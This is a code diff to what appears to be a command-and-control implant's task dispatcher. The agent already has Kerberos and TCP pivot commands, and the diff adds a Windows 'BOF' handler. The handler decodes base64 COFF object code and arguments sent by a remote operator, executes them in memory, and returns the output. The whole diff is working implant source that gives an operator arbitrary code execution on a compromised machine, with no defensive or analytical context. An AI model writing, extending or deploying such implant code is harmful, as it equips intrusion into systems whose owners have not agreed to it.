@@ -1,4 +1,5 @@
 #include "commands.h"
+#include "bof.h"
 #include "kerberos.h"
 #include "transport.h"
 #include "config.h"
@@ -2492,6 +2493,77 @@ void dispatch_task(AgentTask *task) {
         tcp_pivot_stop();
         agent_send_result(task->id, "[+] TCP pivot stopped", "");
     }
+#ifdef _WIN32
+    else if (strcmp(type_upper, "BOF") == 0) {
+        /* args JSON: {"coff_b64":"<base64 COFF>","args_b64":"<base64 packed args>"} */
+        const char *coff_start = NULL;
+        const char *args_start = NULL;
+        size_t coff_b64_len = 0, args_b64_len = 0;
+
+        /* Extract coff_b64 value */
+        const char *p = strstr(args, "\"coff_b64\"");
+        if (p) {
+            p = strchr(p + 10, '"');
+            if (p) {
+                p++;
+                const char *end = p;
+                while (*end && *end != '"') end++;
+                coff_start   = p;
+                coff_b64_len = (size_t)(end - p);
+            }
+        }
+        if (!coff_start || coff_b64_len == 0) {
+            agent_send_result(task->id, "", "BOF: missing coff_b64"); return;
+        }
+
+        char *coff_b64 = (char *)malloc(coff_b64_len + 1);
+        if (!coff_b64) { agent_send_result(task->id, "", "BOF: oom"); return; }
+        memcpy(coff_b64, coff_start, coff_b64_len);
+        coff_b64[coff_b64_len] = '\0';
+
+        size_t coff_len = 0;
+        uint8_t *coff_data = b64_decode(coff_b64, &coff_len);
+        free(coff_b64);
+        if (!coff_data || coff_len == 0) {
+            free(coff_data);
+            agent_send_result(task->id, "", "BOF: coff_b64 decode failed"); return;
+        }
+
+        /* Extract optional args_b64 value */
+        uint8_t *bof_args  = NULL;
+        size_t   bof_alen  = 0;
+        p = strstr(args, "\"args_b64\"");
+        if (p) {
+            p = strchr(p + 10, '"');
+            if (p) {
+                p++;
+                const char *end = p;
+                while (*end && *end != '"') end++;
+                args_start   = p;
+                args_b64_len = (size_t)(end - p);
+                if (args_b64_len > 0) {
+                    char *ab64 = (char *)malloc(args_b64_len + 1);
+                    if (ab64) {
+                        memcpy(ab64, args_start, args_b64_len);
+                        ab64[args_b64_len] = '\0';
+                        bof_args = b64_decode(ab64, &bof_alen);
+                        free(ab64);
+                    }
+                }
+            }
+        }
+
+        char *out = bof_exec(coff_data, coff_len, bof_args, bof_alen);
+        free(coff_data);
+        free(bof_args);
+        if (out) {
+            agent_send_result(task->id, out, "");
+            free(out);
+        } else {
+            agent_send_result(task->id, "", "BOF: execution failed");
+        }
+    }
+#endif /* _WIN32 */
     else {
         char err[128];
         snprintf(err, sizeof(err), "unknown task type: %s", task->type);
